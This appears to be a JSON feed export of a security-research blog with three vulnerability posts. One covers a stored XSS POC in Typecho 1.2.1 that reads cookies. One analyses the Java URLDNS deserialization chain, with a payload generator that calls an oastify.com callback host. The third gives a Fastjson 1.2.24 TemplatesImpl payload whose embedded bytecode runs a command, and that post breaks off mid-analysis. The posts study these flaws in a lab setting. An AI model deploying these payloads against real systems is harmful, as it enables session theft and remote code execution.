{
    "version": "https://jsonfeed.org/version/1",
    "title": "保持谦逊",
    "subtitle": "",
    "icon": "http://example.com/assets/favicon.ico",
    "description": "这个人很懒，什么都不愿说",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2024/09/05/typecho-xss/",
            "url": "http://example.com/2024/09/05/typecho-xss/",
            "title": "typecho_xss",
            "date_published": "2024-09-05T07:00:06.000Z",
            "content_html": "<h3 id=\"typecho-blogging-platform\"><a class=\"anchor\" href=\"#typecho-blogging-platform\">#</a> Typecho Blogging Platform</h3>\n<blockquote>\n<p>Typecho is a PHP-based blog software and is designed to be the most powerful blog engine in the world. Typecho is released under the GNU General Public License 2.0.</p>\n</blockquote>\n<p>Link address：<a href=\"https://github.com/typecho/typecho/\">https://github.com/typecho/typecho/</a></p>\n<p>This open source project has an XSS vulnerability, which can be exploited by attackers to obtain sensitive information such as cookies of a large number of users (including administrators), which is very harmful.</p>\n<p>Affected versions：v1.2.1</p>\n<h3 id=\"environment-construction\"><a class=\"anchor\" href=\"#environment-construction\">#</a> Environment Construction</h3>\n<ul>\n<li>php 7.4.3</li>\n<li>MySQL 8.0.12</li>\n<li>Nginx 1.15.11</li>\n</ul>\n<p>Download the source code file. After opening the environment, visit <a href=\"http://localhost:8191/\">http://localhost:8191/</a> (the main directory of the project) and you will be redirected to the installation interface.</p>\n<p><img loading=\"lazy\" data-src=\"/2024/09/05/typecho-xss/image-20240905151622013.png\" class title=\"image-20240905151622013\"></p>\n<p>Click the button below to start the installation. In the initial configuration interface, make the following configurations. The advanced options are set to default.</p>\n<p><img loading=\"lazy\" data-src=\"/2024/09/05/typecho-xss/image-20240905151824112.png\" class title=\"image-20240905151824112\"></p>\n<p>Before clicking to start the installation, you need to create the database typecho1.2.1</p>\n<p><img loading=\"lazy\" data-src=\"/2024/09/05/typecho-xss/image-20240905152010657.png\" class title=\"image-20240905152010657\"></p>\n<p>After creation, click Start Installation above, and set the administrator's account password and email address when creating an administrator account.</p>\n<p><img loading=\"lazy\" data-src=\"/2024/09/05/typecho-xss/image-20240905152149510.png\" class title=\"image-20240905152149510\"></p>\n<p>Click Continue to install. The installation is successful.</p>\n<p><img loading=\"lazy\" data-src=\"/2024/09/05/typecho-xss/image-20240905152212895.png\" class title=\"image-20240905152212895\"></p>\n<h3 id=\"verification-process\"><a class=\"anchor\" href=\"#verification-process\">#</a> Verification Process</h3>\n<p>At this time, write an article directly and publish it</p>\n<p><img loading=\"lazy\" data-src=\"/2024/09/05/typecho-xss/image-20240905152352963.png\" class title=\"image-20240905152352963\"></p>\n<p>Then use another browser (simulating other users) to access the link <a href=\"http://localhost:8191/\">http://localhost:8191/</a>, and enter the article homepage of the admin user.</p>\n<p><img loading=\"lazy\" data-src=\"/2024/09/05/typecho-xss/image-20240905152630508.png\" class title=\"image-20240905152630508\"></p>\n<p>Click on the article just created by the admin user and make the following comment in it</p>\n<p><img loading=\"lazy\" data-src=\"/2024/09/05/typecho-xss/image-20240905152848286.png\" class title=\"image-20240905152848286\"></p>\n<p>As you can see, an XSS attack is attempted at the website entry point. The POC is:</p>\n<pre><code>http://test.com/&quot;onmouseover=&quot;alert(document.cookie)&quot;&quot;\n</code></pre>\n<p>Comment submitted successfully</p>\n<p><img loading=\"lazy\" data-src=\"/2024/09/05/typecho-xss/image-20240905153103187.png\" class title=\"image-20240905153103187\"></p>\n<p>Now go back to the admin user's perspective and click Manage-&gt;Comments to display all the comments, including the comments submitted by the simulated user just now.</p>\n<p><img loading=\"lazy\" data-src=\"/2024/09/05/typecho-xss/image-20240905153302841.png\" class title=\"image-20240905153302841\"></p>\n<p>At this time, move the mouse over the name &quot;user1&quot; and you can see that the script is successfully executed and the cookie information is printed out.</p>\n<p><img loading=\"lazy\" data-src=\"/2024/09/05/typecho-xss/image-20240905153452569.png\" class title=\"image-20240905153452569\"></p>\n<h3 id=\"summarize\"><a class=\"anchor\" href=\"#summarize\">#</a> Summarize</h3>\n<p>At this point, it can be proved that there is an XSS vulnerability, which can be exploited by attackers to steal user information, spread worm viruses, etc., which is very harmful.</p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/07/01/URLDNS-Deserialize/",
            "url": "http://example.com/2024/07/01/URLDNS-Deserialize/",
            "title": "URLDNS-Deserialize",
            "date_published": "2024-07-01T05:51:50.000Z",
            "content_html": "<h3 id=\"urldns链分析\"><a class=\"anchor\" href=\"#urldns链分析\">#</a> URLDNS 链分析</h3>\n<blockquote>\n<p>URLDNS 链是 ysoserial 中的一条利用链，通常用于监测是否存在 Java 反序列化漏洞，该链有如下特点：</p>\n<p>1、不限制 jdk 版本，使用 java 内置的类，无第三方依赖要求</p>\n<p>2、目标无回显，可通过 DNS 请求验证是否存在反序列化漏洞</p>\n<p>3、该条链只能用来发起 DNS 请求，不能够进行其他利用</p>\n</blockquote>\n<p>该条链子的漏洞的 sink 点为 Java 内置的 <code>java.net.URL</code>  类，该类的 <code>hasCode()</code>  方法会调用 <code>getHostAddress()</code>  方法对目标 host 进行 DNS 解析请求</p>\n<p>首先来看下 <code>hasCode()</code>  方法，该方法在内部又调用了 <code>handler</code>  的 <code>hashCode()</code>  方法， <code>handler</code>  为 <code>URLStreamHandler</code>  类的实例</p>\n<p><img loading=\"lazy\" data-src=\"/2024/07/01/URLDNS-Deserialize/image-20240626165236157.png\" class title=\"image-20240626165236157\"></p>\n<p>继续跟进 <code>handler.hashCode()</code> ，内部调用 <code>getHostAddress()</code>  方法进行 DNS 解析请求，然而有一个前提就是自身的 <code>hashCode</code>  成员属性的值要为 - 1</p>\n<p><img loading=\"lazy\" data-src=\"/2024/07/01/URLDNS-Deserialize/image-20240626170145463.png\" class title=\"image-20240626170145463\"></p>\n<p>接下来就是分析该条链的 kick-off 了，也就是 <code>java.util.HashMap</code>  类，这个类是最常用的 Map 实现类</p>\n<p>由于反序列化的对象是 <code>HashMap</code>  的实例，因此会调用该类的 <code>readObject()</code>  方法，来看一下，在该方法的最后通过循环将序列化对象中的 <code>key</code>  和 <code>value</code>  对象通过 <code>readObject()</code>  方法反序列化后，通过 <code>putVal()</code>  方法将键、值及 hash 信息存入到 HashMap 的成员属性 table 中</p>\n<p><img loading=\"lazy\" data-src=\"/2024/07/01/URLDNS-Deserialize/image-20240626172320550.png\" class title=\"image-20240626172320550\"></p>\n<p>这里首先会先调用 <code>hash()</code>  方法，跟进查看下，发现又调用了 <code>key</code>  的 <code>hashCode()</code>  方法</p>\n<p><img loading=\"lazy\" data-src=\"/2024/07/01/URLDNS-Deserialize/image-20240626221732968.png\" class title=\"image-20240626221732968\"></p>\n<p>所以此时调用链就有了，这里的 <code>key</code>  是可控的，将其设为 <code>URL</code>  类的实例，就可以在反序列化的时候调用 <code>URL</code>  类的 <code>hashCode()</code>  方法，从而发起 DNS 解析请求</p>\n<p>所以 payload 构造如下：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FileOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Field</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">URL</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HashMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">SerializeTest</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> obj<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> oos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sel.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>URL<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">></span></span> hashmap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token class-name\">URL</span> url <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http://fve87323p580x94a5lh6c3ct0k6bu1iq.oastify.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        hashmap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span>hashmap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>然而 <code>HashMap</code>  的 <code>put()</code>  方法同样也会调用 <code>hash()</code>  方法，因此在这一步时也会进行一次 DNS 解析请求</p>\n<p><img loading=\"lazy\" data-src=\"/2024/07/01/URLDNS-Deserialize/image-20240626222759296.png\" class title=\"image-20240626222759296\"></p>\n<p>为了不在生成 payload 的时候就触发 DNS 解析，我们需要通过反射将 URL 对象的 <code>hashCode</code>  的值设置不为 - 1 (在实例化时会默认赋值为 - 1)，在放入 hashmap 之后为了保证后续在反序列化的时候成功触发漏洞调用链，还需要将 <code>hashCode</code>  的值重新设置为 - 1，因此最终的 payload 如下：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FileOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectOutputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>lang<span class=\"token punctuation\">.</span>reflect<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Field</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>net<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">URL</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">HashMap</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">SerializeTest</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Object</span> obj<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token class-name\">ObjectOutputStream</span> oos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sel.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        oos<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span>URL<span class=\"token punctuation\">,</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">></span></span> hashmap <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token class-name\">URL</span> url <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">URL</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"http://fve87323p580x94a5lh6c3ct0k6bu1iq.oastify.com\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token class-name\">Class</span> c <span class=\"token operator\">=</span> url<span class=\"token punctuation\">.</span><span class=\"token function\">getClass</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token class-name\">Field</span> hashcodefield <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">getDeclaredField</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hashCode\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        hashcodefield<span class=\"token punctuation\">.</span><span class=\"token function\">setAccessible</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\">// 这里发送 DNS 请求，要先将 url 对象的 hashcode 设置不为 - 1</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        hashcodefield<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token number\">666</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        hashmap<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token comment\">// 此时要把 hashcode 改回 - 1，否则反序列化时不会触发漏洞点</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        hashcodefield<span class=\"token punctuation\">.</span><span class=\"token function\">set</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span>hashmap<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>编写一个反序列化测试类看看效果：</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FileInputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">ObjectInputStream</span></span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">DeserializeTest</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token class-name\">Object</span> <span class=\"token function\">deserialize</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token class-name\">Filename</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token class-name\">ObjectInputStream</span> ois <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ObjectInputStream</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileInputStream</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">Object</span> obj <span class=\"token operator\">=</span> ois<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">return</span> obj<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">ClassNotFoundException</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token function\">deserialize</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sel.bin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>运行后成功接收到了 DNS 请求</p>\n<p><img loading=\"lazy\" data-src=\"/2024/07/01/URLDNS-Deserialize/image-20240626223710326.png\" class title=\"image-20240626223710326\"></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2024/06/26/Fastjson-Deserialize/",
            "url": "http://example.com/2024/06/26/Fastjson-Deserialize/",
            "title": "Fastjson-Deserialize",
            "date_published": "2024-06-26T03:43:51.000Z",
            "content_html": "<h3 id=\"fastjson-1224\"><a class=\"anchor\" href=\"#fastjson-1224\">#</a> Fastjson-1.2.24</h3>\n<blockquote>\n<p>影响版本： <code>fastjson &lt;= 1.2.24</code>  描述：fastjson 默认使用  <code>@type</code>  指定反序列化任意类，攻击者可以通过在 Java 常见环境中寻找能够构造恶意类的方法，通过反序列化的过程中调用的 getter/setter 方法，以及目标成员变量的注入来达到传参的目的，最终形成恶意调用链。</p>\n</blockquote>\n<p>payload:</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token property\">\"@type\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token property\">\"_bytecodes\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"yv66vgAAADQAJgoABwAXCgAYABkIABoKABgAGwcAHAoABQAXBwAdAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHAB4BAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYHAB8BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACABAApTb3VyY2VGaWxlAQAJRXZpbC5qYXZhDAAIAAkHACEMACIAIwEABGNhbGMMACQAJQEAHWNvbS9leGFtcGxlL2Zhc3Rqc29uZGVtby9FdmlsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2xhbmcvRXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAUABwAAAAAABAABAAgACQACAAoAAAAuAAIAAQAAAA4qtwABuAACEgO2AARXsQAAAAEACwAAAA4AAwAAAAwABAANAA0ADgAMAAAABAABAA0AAQAOAA8AAgAKAAAAGQAAAAMAAAABsQAAAAEACwAAAAYAAQAAABIADAAAAAQAAQAQAAEADgARAAIACgAAABkAAAAEAAAAAbEAAAABAAsAAAAGAAEAAAAWAAwAAAAEAAEAEAAJABIAEwACAAoAAAAlAAIAAgAAAAm7AAVZtwAGTLEAAAABAAsAAAAKAAIAAAAYAAgAGQAMAAAABAABABQAAQAVAAAAAgAW\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t<span class=\"token property\">\"_name\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"h40vv3n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token property\">\"_tfactory\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token property\">\"_outputProperties\"</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h4 id=\"templatesimpl反序列化\"><a class=\"anchor\" href=\"#templatesimpl反序列化\">#</a> TemplatesImpl 反序列化</h4>\n<h5 id=\"漏洞分析\"><a class=\"anchor\" href=\"#漏洞分析\">#</a> 漏洞分析</h5>\n<p>TemplatesImpl 类位于 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.java</code></p>\n<p>其实现了 Serializable 接口，因此可被序列化，查看该文件，寻找漏洞点</p>\n<p>在 <code>getTransletInstance()</code>  方法中，发现了利用点，成员属性 <code>_class</code>  是一个 Class 类型的数组，下标为 <code>_transletIndex</code>  的类会使用 <code>newInstance()</code>  方法进行实例化</p>\n<p><img loading=\"lazy\" data-src=\"/2024/06/26/Fastjson-Deserialize/image-20240617203054954.png\" class 